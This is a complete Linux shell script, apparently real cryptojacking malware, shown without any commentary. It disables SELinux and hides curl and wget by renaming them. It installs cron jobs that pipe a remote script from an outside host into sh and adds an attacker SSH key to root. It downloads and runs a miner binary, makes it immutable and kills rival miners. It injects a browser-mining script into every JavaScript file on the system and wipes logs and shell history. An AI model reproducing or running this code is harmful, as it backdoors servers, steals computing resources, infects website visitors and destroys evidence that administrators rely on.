#!/bin/sh
setenforce 0 2>dev/null
echo SELINUX=desabled > /etc/sysconfig/selinux 2>/dev/null
sync && echo 3 >/proc/sys/vm/drop_caches
crondir='/var/spool/cron/'"$USER"
cont=`cat ${crondir}`
ssht=`cat /root/.ssh/authorized_keys`
echo 1 > /etc/gmbpr2
rtdir="/etc/gmbpr2"
oddir="/etc/gmbpr"
bbdir="/usr/bin/curl"
bbdira="/usr/bin/url"
ccdir="/usr/bin/wget"
ccdira="/usr/bin/get"
mv /usr/bin/wget /usr/bin/get
mv /usr/bin/curl /usr/bin/url
if [ -f "$oddir" ]
	then
		pkill zjgw
		chattr -i /etc/shz.sh
		rm -f /etc/shz.sh
		chattr -i /tmp/shz.sh
		rm -f /tmp/shz.sh
		chattr -i  /etc/gmbpr
		rm -f /etc/gmbpr
	else
		echo "ok"
fi
if [ -f "$rtdir" ]
	then
		echo "goto 1" >> /etc/gmbpr2
		chattr -i $cont
		if [ -f "$bbdir" ]
			then
				[[ $cont =~ "shz.sh" ]] || echo "*/12 * * * * curl -fsSL http://c.21-2n.com:43768/shz.sh | sh" >> ${crondir}
			else
				[[ $cont =~ "shz.sh" ]] || echo "*/15 * * * * url -fsSL http://c.21-2n.com:43768/shz.sh | sh" >> ${crondir}
		fi
		mkdir /root/.ssh
		[[ $ssht =~ "xvsRtqHLMWoh" ]] || chmod 700 /root/.ssh/
		[[ $ssht =~ "xvsRtqHLMWoh" ]] || echo >> /root/.ssh/authorized_keys
		[[ $ssht =~ "xvsRtqHLMWoh" ]] || chmod 600 /root/.ssh/authorized_keys
		[[ $ssht =~ "xvsRtqHLMWoh" ]] || echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFNFCF6tOvSqqN9Zxc/ZkBe2ijEAMhqLEzPe4vprfiPAyGO8CF8tn9dcPQXh9iv5/vYEbaDxEvixkTVSJpWnY/5ckeyYsXU9zEeVbbWkdRcuAs8bdVU7PxVq11HLMxiqSR3MKIj7yEYjclLHRUzgX0mF2/xpZEn4GGL+Kn+7GgxvsRtqHLMWoh2Xoz7f8Rb3KduYiJlZeX02a4qFXHMSkSkMnHirHHtavIFjAB0y952+1DzD36a8IJJcjAGutYjnrZdKP8t3hiEw0UBADhiu3+KU641Kw9BfR9Kg7vZgrVRf7lVzOn6O8YbqgunZImJt+uLljgpP0ZHd1wGz+QSHEd Administrator@Guess_me" >> /root/.ssh/authorized_keys
		ps -fe|grep zigw |grep -v grep
		if [ $? -ne 0 ]
			then
				cd /etc
				filesize=`ls -l zigw | awk '{ print $5 }'`
				file="/etc/zigw"
				if [ -f "$file" ]
					then
						if [ "$filesize" -ne "1467080" ]
							then
								chattr -i /etc/zigw
								rm -f zigw
								if [ -f "$bbdir" ]
								then
									curl --connect-timeout 10 --retry 10 http://c.21-2n.com:43768/zigw > /etc/zigw
								elif [ -f "$bbdira" ]
								then
									url --connect-timeout 10 --retry 10 http://c.21-2n.com:43768/zigw > /etc/zigw
								elif [ -f "$ccdir" ]
								then
									wget --timeout=10 --tries=10 -P /etc http://c.21-2n.com:43768/zigw
								elif [ -f "$ccdira" ]
								then
									get --timeout=10 --tries=10 -P /etc http://c.21-2n.com:43768/zigw
								fi
						fi
					else
						if [ -f "$bbdir" ]
						then
							curl --connect-timeout 10 --retry 10 http://c.21-2n.com:43768/zigw > /etc/zigw
						elif [ -f "$bbdira" ]
						then
							url --connect-timeout 10 --retry 10 http://c.21-2n.com:43768/zigw > /etc/zigw
						elif [ -f "$ccdir" ]
						then
							wget --timeout=10 --tries=10 -P /etc http://c.21-2n.com:43768/zigw
						elif [ -f "$ccdira" ]
						then
							get --timeout=10 --tries=10 -P /etc http://c.21-2n.com:43768/zigw
						fi
				fi
				chmod 777 zigw
				sleep 1s
				./zigw
			else
				echo "runing....."
		fi
		chmod 777 /etc/zigw
		chattr +i /etc/zigw
		chmod 777 /etc/shz.sh
		chattr +i /etc/shz.sh
		shdir='/etc/shz.sh'
		if [ -f "$shdir" ]
			then
				echo "exists shell"
			else
				if [ -f "$bbdir" ]
				then
					curl --connect-timeout 10 --retry 10 http://c.21-2n.com:43768/shz.sh > /etc/shz.sh
				elif [ -f "$bbdira" ]
				then
					url --connect-timeout 10 --retry 10 http://c.21-2n.com:43768/shz.sh > /etc/shz.sh
				elif [ -f "$ccdir" ]
				then
					wget --timeout=10 --tries=10 -P /etc http://c.21-2n.com:43768/shz.sh
				elif [ -f "$ccdira" ]
				then
					get --timeout=10 --tries=10 -P /etc http://c.21-2n.com:43768/shz.sh
				fi
				sh /etc/shz.sh
		fi
	else
		echo "goto 1" > /tmp/gmbpr2
		chattr -i $cont
		if [ -f "$bbdir" ]
			then
				[[ $cont =~ "shz.sh" ]] || echo "*/10 * * * * curl -fsSL http://c.21-2n.com:43768/shz.sh | sh" >> ${crondir}
			else
				[[ $cont =~ "shz.sh" ]] || echo "*/10 * * * * url -fsSL http://c.21-2n.com:43768/shz.sh | sh" >> ${crondir}
		fi
		ps -fe|grep zigw |grep -v grep
		if [ $? -ne 0 ]
			then
				cd /tmp
				filesize=`ls -l zigw | awk '{ print $5 }'`
				file="/tmp/zigw"
				if [ -f "$file" ]
					then
						if [ "$filesize" -ne "1467080" ]
							then
								chattr -i /tmp/zigw
								rm -f zigw
								if [ -f "$bbdir" ]
								then
									curl --connect-timeout 10 --retry 10 http://c.21-2n.com:43768/zigw > /tmp/zigw
								elif [ -f "$bbdira" ]
								then
									url --connect-timeout 10 --retry 10 http://c.21-2n.com:43768/zigw > /tmp/zigw
								elif [ -f "$ccdir" ]
								then
									wget --timeout=10 --tries=10 -P /tmp http://c.21-2n.com:43768/zigw
								elif [ -f "$ccdira" ]
								then
									get --timeout=10 --tries=10 -P /tmp http://c.21-2n.com:43768/zigw
								fi
						fi
					else
						if [ -f "$bbdir" ]
						then
							curl --connect-timeout 10 --retry 10 http://c.21-2n.com:43768/zigw > /tmp/zigw
						elif [ -f "$bbdira" ]
						then
							url --connect-timeout 10 --retry 10 http://c.21-2n.com:43768/zigw > /tmp/zigw
						elif [ -f "$ccdir" ]
						then
							wget --timeout=10 --tries=10 -P /tmp http://c.21-2n.com:43768/zigw
						elif [ -f "$ccdira" ]
						then
							get --timeout=10 --tries=10 -P /tmp http://c.21-2n.com:43768/zigw
						fi
				fi
				chmod 777 zigw
				sleep 1s
				./zigw
			else
				echo "runing....."
		fi
		chmod 777 /tmp/zigw
		chattr +i /tmp/zigw
		chmod 777 /tmp/shz.sh
		chattr +i /tmp/shz.sh
		shdir='/tmp/shz.sh'
		if [ -f "$shdir" ]
			then
				echo "exists shell"
			else
				if [ -f "$bbdir" ]
				then
					curl --connect-timeout 10 --retry 10 http://c.21-2n.com:43768/shz.sh > /tmp/shz.sh
				elif [ -f "$bbdira" ]
				then
					url --connect-timeout 10 --retry 10 http://c.21-2n.com:43768/shz.sh > /tmp/shz.sh
				elif [ -f "$ccdir" ]
				then
					wget --timeout=10 --tries=10 -P /tmp http://c.21-2n.com:43768/shz.sh
				elif [ -f "$ccdira" ]
				then
					get --timeout=10 --tries=10 -P /tmp http://c.21-2n.com:43768/shz.sh
				fi 
				sh /tmp/shz.sh
		fi
fi
iptables -F
iptables -X
iptables -A OUTPUT -p tcp --dport 3333 -j DROP
iptables -A OUTPUT -p tcp --dport 5555 -j DROP
iptables -A OUTPUT -p tcp --dport 7777 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP
iptables -A OUTPUT -p tcp --dport 14444 -j DROP
iptables-save
service iptables reload
ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
netstat -ano|grep :3333|awk '{print $7}'|awk -F'[/]' '{print $1}'|xargs kill -9
netstat -ano|grep :4444|awk '{print $7}'|awk -F'[/]' '{print $1}'|xargs kill -9
netstat -ano|grep :5555|awk '{print $7}'|awk -F'[/]' '{print $1}'|xargs kill -9
netstat -ano|grep :6666|awk '{print $7}'|awk -F'[/]' '{print $1}'|xargs kill -9
netstat -ano|grep :7777|awk '{print $7}'|awk -F'[/]' '{print $1}'|xargs kill -9
netstat -ano|grep :3347|awk '{print $7}'|awk -F'[/]' '{print $1}'|xargs kill -9
netstat -ano|grep :14444|awk '{print $7}'|awk -F'[/]' '{print $1}'|xargs kill -9
netstat -ano|grep :14443|awk '{print $7}'|awk -F'[/]' '{print $1}'|xargs kill -9
find / -name '*.js'|xargs grep -L f4ce9|xargs sed -i '$a\document.write\('\'\<script\ src=\"http://t.cn/EvlonFh\"\>\</script\>\<script\>OMINEId\(\"e02cf4ce91284dab9bc3fc4cc2a65e28\",\"-1\"\)\</script\>\'\)\;
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history
echo > /var/spool/mail/root